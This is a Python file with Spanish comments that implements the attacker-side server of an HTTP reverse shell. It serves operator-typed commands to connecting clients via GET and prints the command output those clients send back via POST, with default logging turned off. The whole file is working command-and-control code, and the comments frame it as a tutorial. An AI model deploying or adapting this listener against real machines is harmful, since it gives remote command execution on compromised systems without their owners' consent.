# Se creará un servidor HTTP simple que escucha las conexiones entrantes

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs # Esta librería es para parsear URLs y sus parámetros

# Se va a definir la dirección IP y el puerto donde el servidor escuchará
server_ip = "0.0.0.0" # Escuchar en todas las interfaces de red
server_port = 8080    # Puerto donde el servidor escuchará. Se puede usar cualquier puerto disponible

# Se va a indicar cómo manejar las solicitudes HTTP entrantes
class ReverseShellHTTPRequestHandler(BaseHTTPRequestHandler):
    def log_message(self, format: str, *args: any): # Este método desactiva el logging por defecto para evitar mensajes en consola
        return 
    
    def do_GET(self): # Este método maneja las solicitudes GET
        self.send_response(200) # Se envía una respuesta HTTP 200 OK
        self.send_header('Content-type', 'text/html') # Se indica que el contenido es HTML
        self.end_headers() # Se finalizan los encabezados HTTP
        self.wfile.write(input("Shell> ").encode("utf-8")) # Se envía el comando ingresado por el usuario al cliente

    # Mediante GET, el cliente va a obtener los comandos que después se van a ejecutar en su sistema

    def do_POST(self): # Este método maneja las solicitudes POST
        content_length = int(self.headers['Content-Length']) # Se obtiene la longitud del contenido enviado por el cliente
        data = parse_qs(self.rfile.read(content_length).decode("utf-8")) # Se parsea el contenido recibido
        self.send_response(200) # Se envía una respuesta HTTP 200 OK
        self.end_headers() # Se finalizan los encabezados HTTP
        if "response" in data: # Si el cliente envió una respuesta
            print(data["response"][0]) # Se imprime la respuesta del cliente en la consola
        else:
            print(f"[!] No hubo una respuesta del cliente: {data}") # Si no se recibió respuesta, se notifica al usuario
    

# Mediante POST, el cliente va a enviar la salida de los comandos ejecutados en su sistema

if __name__ == "__main__":
    server = HTTPServer((server_ip, server_port), ReverseShellHTTPRequestHandler) # Se crea el servidor HTTP
    print(f"[+] Servidor HTTP escuchando en http://{server_ip}:{server_port}") # Se notifica que el servidor está corriendo
    try:
        server.serve_forever() # El servidor empieza a escuchar las solicitudes entrantes de manera
    except KeyboardInterrupt: # Se permite detener el servidor con Ctrl+C
        print("\n[!] Servidor detenido por el usuario.") 
        server.server_close() # Se cierra el servidor de manera segura indefinidamente